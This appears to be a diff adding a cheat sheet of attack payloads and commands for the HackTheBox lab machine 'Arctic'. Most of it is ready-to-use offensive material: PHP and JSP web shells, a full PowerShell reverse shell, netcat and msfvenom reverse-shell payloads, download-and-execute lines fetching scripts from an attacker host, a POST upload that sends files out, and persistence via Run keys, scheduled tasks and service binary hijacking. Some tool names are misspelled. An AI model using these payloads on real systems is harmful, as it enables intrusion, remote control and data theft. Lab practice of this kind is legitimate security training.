@@ -1,0 +1,112 @@
+# HTB Arctic - Payloads and Commands
+# Collection of useful payloads, commands, and techniques for HTB Arctic
+
+## Reconnaissance Payloads
+
+### Port Scanning
+nmap -sC -sV -oA arctic <TARGET_IP>
+nmap -p- --min-rate 1000 <TARGET_IP>
+nmap -sU --top-ports 1000 <TARGET_IP>
+
+### Service Enumeration
+# HTTP/Web
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+nikkto -h http://<TARGET_IP>
+whatthehell http://<TARGET_IP>
+
+# SMB (if applicable)
+enum4linux -a <TARGET_IP>
+smbclient -L //<TARGET_IP>
+smbmap -H <TARGET_IP>
+
+## Exploitation Payloads
+
+### Common Web Exploits
+# File Upload
+<?php system($_GET['cmd']); ?>
+<%@ page import="java.io.*" %> <%String cmd = request.getParameter("cmd");Process p = Runtime.getRuntime().exec(cmd);%>
+
+### Reverse Shells
+# PowerShell Reverse Shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# NC Reverse Shell (if nc available)
+nc -e cmd.exe <LHOST> <LPORT>
+
+# MSFVenom Windows Payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
+
+## Privilege Escalation
+
+### Windows Enumeration Commands
+systeminfo
+whoami /priv
+net users
+net localgroup administrators
+wmic qfe list
+tasklist /svc
+netstat -ano
+
+### Common PrivEsc Vectors
+# Check for unquoted service paths
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+# Check for AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+### PowerShell Enumeration
+# PowerUp
+IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/PowerUp.ps1')
+Invoke-AllChecks
+
+# Sherlock
+IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/Sherlock.ps1')
+Find-AllVulns
+
+## File Transfer
+
+### Download Files to Target
+# PowerShell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<LHOST>/file.exe','C:\temp\file.exe')"
+IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/script.ps1')
+
+# Certutil
+certutil -urlcache -split -f http://<LHOST>/file.exe file.exe
+
+# BitsAdmin
+bitsadmin /transfer myDownloadJob /download /priority normal http://<LHOST>/file.exe C:\temp\file.exe
+
+### Upload Files from Target
+# PowerShell POST
+$fileContent = Get-Content 'C:\path\to\file.txt' -Raw
+Invoke-RestMethod -Uri 'http://<LHOST>:8000/upload' -Method Post -Body $fileContent
+
+## Persistence
+
+### Registry Run Keys
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\path\to\backdoor.exe"
+
+### Scheduled Tasks
+schtasks /create /tn "MyTask" /tr "C:\path\to\backdoor.exe" /sc daily /st 12:00
+
+## Miscellaneous Commands
+
+### System Information
+echo %USERNAME%
+echo %COMPUTERNAME%
+echo %USERDOMAIN%
+ipconfig /all
+route print
+arp -a
+
+### Process and Service Management
+tasklist
+taskkill /f /pid <PID>
+net start
+net stop <service_name>
+sc query
+sc config <service_name> binpath= "C:\path\to\malicious.exe"
+
+# Note: Replace <TARGET_IP>, <LHOST>, <LPORT> with actual values during exploitation
